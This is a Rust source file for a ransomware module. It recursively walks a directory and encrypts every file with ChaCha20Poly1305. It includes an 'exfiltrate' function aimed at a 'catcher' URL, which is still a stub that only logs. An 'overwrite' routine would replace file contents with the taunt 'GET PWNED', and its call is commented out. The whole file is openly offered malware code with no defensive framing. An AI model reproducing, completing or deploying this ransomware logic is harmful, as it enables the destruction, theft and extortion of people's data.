use chacha20poly1305::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    ChaCha20Poly1305, Key, Nonce,
};
use config::Config;
use log::{error, info};
use std::{
    fmt,
    fs::{read_dir, DirEntry, File, ReadDir},
    io::{Read, Write},
    path::PathBuf,
};

type ByteCount = usize;
static TAUNT: &[u8; 9] = b"GET PWNED";

pub fn ransom(root: &str, catcher: &str) {
    info!("ransom mode");
    let files = read_dir(root);
    if let Ok(entries) = files {
        encrypt_dir(entries, catcher)
    } else {
        error!("could not read {root:?}")
    }
}

#[derive(Debug)]
struct EncryptedFile {
    key: Key,
    nonce: Nonce,
    ciphertext: Vec<u8>,
    path: PathBuf,
}

impl EncryptedFile {
    fn ciphertext(&self) -> &[u8] {
        self.ciphertext.as_ref()
    }
}

// EncryptedFile can be generated from a reference to a directory entry
impl From<&DirEntry> for EncryptedFile {
    fn from(value: &DirEntry) -> Self {
        let mut buf: String = String::new();
        let path: PathBuf = value.path();

        if let Ok(mut file) = File::open(path) {
            if let Ok(bytes) = file.read_to_string(&mut buf) {
                info!("wrote {bytes:?} bytes");
            }
        }

        let key = ChaCha20Poly1305::generate_key(&mut OsRng);
        let cipher = ChaCha20Poly1305::new(&key);
        let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng); // 96-bits; unique per message
        if let Ok(ciphertext) = cipher.encrypt(&nonce, buf.as_bytes().as_ref()) {
            Self {
                ciphertext,
                nonce,
                path: value.path(),
                key,
            }
        } else {
            // just the plaintext
            Self {
                ciphertext: buf.as_bytes().to_vec(),
                nonce,
                path: value.path(),
                key,
            }
        }
    }
}

fn encrypt_dir(files: ReadDir, catcher: &str) -> () {
    for file in files {
        info!("entry {file:?}:");
        if let Ok(entry) = file {
            if let Ok(filetype) = entry.file_type() {
                if filetype.is_dir() {
                    if let Ok(new_files) = read_dir(entry.path()) {
                        encrypt_dir(new_files, catcher)
                    }
                } else {
                    if let Ok(byte_count) = encrypt_file(entry, catcher) {
                        info!("encrypted {byte_count:?} bytes{}", '\n')
                    } else {
                        error!("could not encrypt")
                    }
                }
            } else {
                error!("could not determine file type");
            }
        } else {
            error!("could not open file");
        }
    }
}

fn encrypt_file(file: DirEntry, catcher: &str) -> Result<ByteCount, &'static str> {
    let enc_file = EncryptedFile::from(&file);
    exfiltrate(enc_file, catcher)
    // overwrite(file) // CAUTION: OVERWRITES ALL FILES BELOW CURRENT DIRECTORY NODE
}

fn exfiltrate(file: EncryptedFile, catcher: &str) -> Result<ByteCount, &'static str> {
    info!("sending {file:?} to URL: {catcher:?}");
    Ok(file.ciphertext().len()) // TODO
}

fn overwrite(file: DirEntry) -> Result<ByteCount, &'static str> {
    if let Ok(mut new_file) = File::create(file.path()) {
        new_file.write_all(TAUNT);
    }
    Ok(0)
}
